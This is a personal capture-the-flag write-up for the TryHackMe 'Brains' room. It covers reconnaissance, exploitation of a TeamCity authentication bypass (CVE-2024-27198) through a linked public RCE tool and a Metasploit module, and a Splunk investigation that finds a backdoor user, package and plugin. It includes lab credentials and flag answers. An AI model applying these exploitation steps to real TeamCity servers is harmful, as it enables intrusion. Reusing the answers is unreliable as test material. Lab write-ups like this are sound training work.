#CTF #Easy #Subscribers #Splunk 

https://tryhackme.com/room/brains

```
10.10.32.212
nano /etc/hosts      brains.thm

## nmap 

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
|_http-title: Maintenance
50000/tcp open  ibm-db2
MAC Address: 02:01:7C:33:DE:65 (Unknown)

## gobuster

gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -t64 --no-error | lolcat

/server-status

## ffuf = nothing

http://brains.thm
nothing

http://brains.thm:50000

http://brains.thm:50000/login.html

Login page
TeamCity Version 2023.11.3 (build 147512)

https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/

- an alternative path issue
- authentication bypass vulnerability in the web component of TeamCity that arises from a path traversal issue

//https://github.com/W01fh4cker/CVE-2024-27198-RCE
//git clone https://github.com/W01fh4cker/CVE-2024-27198-RCE.git
//pip install requests urllib3 faker

## msfconsole
use 4
show options
set RHOST 10.10.32.212
set RPORT 50000
run

meterpreter> ls
cd ~
ls
cd /home/ubuntu
ls
cat flag.txt

THM{faa9bac345709b6620a6200b484c7594}
```

```
What is the content of flag.txt in the user's home folder?

THM{faa9bac345709b6620a6200b484c7594}
```

## blue team

Lab Connection

Before moving forward, deploy the machine. When you deploy the machine, it will be assigned an IP address: `10.10.32.212`. The Splunk instance will  be accessible in about **5 minutes** and can be accessed at `10.10.32.212:8000` using the credentials mentioned below:
```
splunk : analyst123

search & reporting > data summary > auth_logs > sourcetypes

change time to Today

10 more fields > check name, USER

fwupd-refresh
ssl-cert
eviluser
ubuntu

back to data summary > packages

change time from Last 24 hrs to 'Since 7/4/24' 
click on 'installed' add to search 

7/4/24 10:58:25  installed datacollector

data summary > sources/teamcity-activities.log

source="/opt/teamcity/TeamCity/logs/teamcity-activities.log" plugin

change date to 7/4/2024 - 7/5/2024

AyzzbuXY.zip

```

```
What is the name of the backdoor user which was created on the server after exploitation?

eviluser

What is the name of the malicious-looking package installed on the server?

datacollector

What is the name of the plugin installed on the server after successful exploitation?

AyzzbuXY.zip

```

- needed ONLY for splunk !
- https://cyber-owl.medium.com/thm-brains-walkthrough-easy-5bb93c1b1c1d

120 points 

![brains](https://tryhackme-images.s3.amazonaws.com/room-icons/645b19f5d5848d004ab9c9e2-1721215647417)

